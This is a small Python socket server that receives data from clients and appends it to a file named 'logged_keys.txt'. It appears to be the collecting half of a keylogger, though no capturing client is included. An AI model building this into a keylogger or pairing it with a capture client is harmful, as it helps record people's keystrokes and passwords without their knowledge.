import socket
import sys

class Server:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.bind((self.host, self.port))

    def listen(self):
        self.server.listen()
        print(f"Server listening on {self.host}:{self.port}")
        while True:
            conn, addr = self.server.accept()
            print(f"Connection from {addr}")
            conn.send(bytes("Connection established", 'utf-8'))
            try:
                while True:
                    data = conn.recv(1024).decode()
                    if not data:
                        break
                    print(f"Received data: {data}")
                    with open('logged_keys.txt', 'a') as logged_keys:
                        logged_keys.write(data)
                    conn.send(bytes("Data received", 'utf-8'))
        
            except (ConnectionResetError, socket.error):                
                print("The connection was closed by the client.")
                sys.exit()

                    
                    
            conn.close()

if __name__ == "__main__":
    host = "localhost"
    port = 8080
    server = Server(host, port)
    server.listen()
